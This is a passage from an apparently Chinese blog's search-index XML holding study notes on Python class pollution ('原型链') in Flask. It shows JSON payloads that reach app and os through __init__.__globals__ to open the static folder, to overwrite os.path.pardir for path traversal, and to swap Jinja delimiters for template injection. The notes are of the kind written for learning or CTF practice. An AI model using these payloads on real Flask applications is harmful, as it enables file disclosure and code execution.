class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;app&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;_static_folder&quot;</span>:<span class="hljs-string">&quot;./&quot;</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment"># 在 flask 应用下访问 GET /../XXX 一般都会报错500，在 temlating.py 模块下发生</span><br>HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">500</span> INTERNAL SERVER ERROR<br><span class="hljs-comment">## 这是一个在模板渲染的时候为了防止目录穿梭进行的操作</span><br><span class="hljs-comment">## 使用 os.path.pairdir 来检验，其值为 .. </span><br><span class="hljs-comment">## 这个污染的是os模块下的吗？？？如果是的话为什么能污染到那？是因为是内置模块？</span><br><span class="hljs-comment">### 是因为 os 被 import 导入了</span><br><span class="hljs-comment">## 将其修改为任意值就能进行穿梭了</span><br>payload=&#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;os&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;path&quot;</span>:&#123;<br>                    <span class="hljs-string">&quot;pardir&quot;</span>:<span class="hljs-string">&quot;,&quot;</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment"># `Flask.jinja_env.variable_start_string = &quot;xxx&quot;`</span><br><span class="hljs-comment">## 实现对`Jinja`语法标识符进行替换，这里把 &#123;&#123; 换成了 [[</span><br>payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span> : &#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span> : &#123;<br>            <span class="hljs-string">&quot;app&quot;</span> : &#123;<br>                    <span class="hljs-string">&quot;jinja_env&quot;</span> :&#123;<br><span class="hljs-string">&quot;variable_start_string&quot;</span> : <span class="hljs-string">&quot;[[&quot;</span>,<span class="hljs-string">&quot;variable_end_string&quot;</span>:<span class="hljs-string">&quot;]]&quot;</span><br>&#125;        <br>            &#125;<br>        &#125;<br>    &#125;<br><span class="hljs-comment">### 需要先污染再访问模板，因为会有缓存</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>原型链</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原型链</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
